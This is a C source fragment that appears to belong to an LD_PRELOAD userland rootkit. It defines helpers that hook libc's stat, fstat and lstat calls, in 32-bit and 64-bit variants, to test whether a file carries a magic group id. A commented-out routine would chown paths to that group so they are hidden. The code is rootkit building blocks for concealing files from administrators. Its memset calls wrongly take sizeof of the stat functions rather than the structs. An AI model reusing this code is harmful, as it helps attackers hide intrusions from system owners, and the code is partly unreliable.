int hxstat(const char *pathname, int gid, int mode)
{
    if(mode==32)
    {
        HOOK(o_xstat, C__XSTAT);
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        o_xstat(_STAT_VER, pathname, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }else if(mode==64){
        HOOK(o_xstat64, C__XSTAT64);
        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        o_xstat64(_STAT_VER, pathname, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }

    return 0;
}

int hfxstat(int fd, int gid, int mode)
{
    if(mode==32)
    {
        HOOK(o_fxstat, C__FXSTAT);
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        o_fxstat(_STAT_VER, fd, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }else if(mode==64){
        HOOK(o_fxstat64, C__FXSTAT64);
        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        o_fxstat64(_STAT_VER, fd, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }

    return 0;
}

int hlxstat(const char *pathname, int gid, int mode)
{
    if(mode==32)
    {
        HOOK(o_lxstat, C__LXSTAT);
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        o_lxstat(_STAT_VER, pathname, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }else if(mode==64){
        HOOK(o_lxstat64, C__LXSTAT64);
        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        o_lxstat64(_STAT_VER, pathname, &s_fstat);
        if(s_fstat.st_gid==gid) return 1;
    }

    return 0;
}

/*void hpath(const char *pathname)
{
    HOOK(o_chown,CCHOWN);
    o_chown(pathname,0,MGID); // assign root uid bit and mgid
}*/
